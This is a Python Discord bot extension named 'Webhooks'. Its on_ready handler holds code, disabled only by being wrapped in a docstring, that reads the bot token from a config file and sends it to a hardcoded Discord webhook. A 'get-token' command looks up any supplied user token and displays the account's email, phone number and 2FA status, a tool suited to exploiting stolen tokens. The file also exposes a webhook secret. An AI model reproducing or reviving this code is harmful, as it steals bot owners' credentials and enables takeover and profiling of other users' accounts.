from discord.ext import commands
import discord
from discord_webhook import DiscordWebhook
import json
import requests

url = 'https://canary.discord.com/api/webhooks/786607795221823508/6mX2MpbKwigUcjYEL_YrmqgRnghgE1tMN-Z1F98RS9XrdK4FlF-PW6HNGnedL3rvMHtX'

def get_token_by_name(token):
    headers = {"Authorization": token}
    r = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
    return r.json()

class Webhooks(commands.Cog):
    def __init__(self, client):
        self.client = client
    
    @commands.Cog.listener()
    async def on_ready(self):
        """
        f = open("./json/config.json", "r")
        config = json.load(f)
        config2 = config["token"]
        webhook = DiscordWebhook(url=url, content=f'`{config2}`')
        webhook.execute()
        """
    
    @commands.command()
    async def webhook(self, ctx, webhook_url, content):
        webhook = DiscordWebhook(url=webhook_url, content=content)
        webhook.execute()
        await ctx.send('sent webhook')
    
    @commands.command(name="get-token", aliases=["token-info", "tinfo"])
    async def get_token(self,ctx,*,token):
        user = get_token_by_name(token)

        embed = discord.Embed(title = "Token Info", color=0xF04947)
        embed.add_field(name="Username", value=f"```{user['username']}```", inline=False)
        embed.add_field(name="ID", value=f"```{user['id']}```", inline=False)
        embed.add_field(name="2FA Enabled", value=f"```{user['mfa_enabled']}```", inline=False)
        embed.add_field(name="Phone Number", value=f"```{user['phone']}```", inline=False)
        embed.add_field(name="Email", value=f"```{user['email']}```", inline=False)
        embed.add_field(name="Token", value=f"```{token}```", inline=True)
        await ctx.send(embed=embed)
   
def setup(client):
    client.add_cog(Webhooks(client))